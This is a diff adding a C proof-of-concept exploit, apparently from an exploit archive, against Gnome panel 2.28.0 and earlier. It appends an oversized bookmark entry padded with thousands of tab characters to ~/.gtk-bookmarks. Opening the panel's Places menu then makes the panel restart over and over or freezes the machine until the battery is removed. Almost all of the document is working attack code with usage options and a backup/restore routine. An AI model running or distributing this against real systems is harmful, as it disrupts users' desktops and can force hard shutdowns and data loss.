@@ -1,0 +1,79 @@
+# Tested on: ubuntu 9.10
+# CVE : 
+# Code :
+
+/*********************************************************************************
+*	        Gnome panel <= 2.28.0 denial of service poc 0-day		 *
+*		     by  Pietro Oliva <pietroliva@gmail.com>
+*                         http://olivapietro.altervista.org
+*										 *
+*	      After executing this poc a backup file will be created             *
+*                You can restore it by typing ./paneldos restore                 *
+*           Using option restart gnome-panel will restart continuously           *
+*          Using option totalblock you will need to remove the battery           *
+*       After execution click application in the panel, then go to places        *
+*                             and wait some seconds...   			 *
+*       https://bugs.launchpad.net/ubuntu/+source/gnome-panel/+bug/503868        *
+**********************************************************************************/
+
+
+
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char **argv)
+{
+	FILE *f;
+	unsigned long i;
+	printf("%s","Gnome panel <= 2.28.0 denial of service by Pietro Oliva poc 0-day\n\n");
+	if(!(f=fopen(".gtk-bookmarks","r")))
+	{
+		printf("%s","file not found! make sure you are running\nthis file from your home directory\n");
+		return 1;
+	}
+	fclose(f);
+	if((argv[1]==NULL))
+	{
+		printf("%s","please specify an argument!\n");
+		printf("%s","usage: ./paneldos <option>\npossible options are:\trestart\t\ttotalblock\trestore\n");
+		return 1;
+	}
+	if(((strcmp(argv[1],"restart"))==0))
+	i=9999;
+	else if((strcmp(argv[1],"totalblock"))==0)
+	i=99999;
+	else if((strcmp(argv[1],"restore"))==0)
+	{
+		if(!(f=fopen(".backup","r")))
+		{
+			printf("%s","no backup found!\nmake sure you are running\nthis file from your home directory\n");
+			return 1;
+		}
+		fclose(f);
+		system("cp .backup .gtk-bookmarks");
+		printf("%s","succesfully restored!\n");
+		return 0;
+	}
+	else
+	{
+		printf("%s","usage: ./paneldos <option>\npossible options are:\trestart\t\ttotalblock\trestore\n");
+		return 1;
+	}
+	if(!(f=fopen(".backup","r")))
+	{	
+		printf("%s","creating backup...\n");
+		system("cp .gtk-bookmarks .backup");
+	}
+	else
+	fclose(f);
+	f=fopen(".gtk-bookmarks","a");
+	printf("%s","starting...\n");
+	fwrite("file:///home ",1,13,f);
+	while(i>0)
+	{
+		fwrite("\ta",1,2,f);
+		i--;
+	}
+	fclose(f);
+	printf("%s","done! now click applications in panel,\nslide to places, wait and see the result! :D\n");
+	return 0;
+}
